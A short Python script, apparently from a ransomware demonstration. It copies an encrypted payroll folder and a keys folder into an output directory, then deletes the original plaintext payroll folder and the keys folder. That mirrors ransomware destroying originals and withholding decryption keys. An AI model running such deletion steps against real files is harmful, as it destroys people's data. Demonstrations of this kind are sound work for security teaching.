import os
import shutil

def move_folder(destination, start):
    # Get the folder name
    folder_name = os.path.basename(os.path.normpath(start))
    # Create full destination path
    destination_path = os.path.join(destination, folder_name)

    try:
        # Create destination directory if necessary
        os.makedirs(destination, exist_ok=True)

        # Copy entire folder and contents
        shutil.copytree(start, destination_path)

        print("Folder successfully moved!")
        print("New location:", destination_path)

    except Exception as error:
        print("Error moving folder:", error)

    
def delete_folder(folder_path):
    # Delete folder and all its contents
    shutil.rmtree(folder_path)
    print("Folder deleted successfully")
    
start_payroll = "C:/Users/EvanW/Desktop/Ransomware demo/Target/Payroll_Encrypted"
destination = "C:/Users/EvanW/Desktop/Ransomware demo/Output"
folder_path_payroll = "C:/Users/EvanW/Desktop/Ransomware demo/Target/Payroll"

start_private_key = "C:/Users/EvanW/Desktop/Ransomware demo/Keys/"
folder_path_private_key = "C:/Users/EvanW/Desktop/Ransomware demo/Keys/"
#Move payroll
move_folder(destination, start_payroll)
delete_folder(folder_path_payroll)

#Move private ke
move_folder(destination, start_private_key)
delete_folder(folder_path_private_key)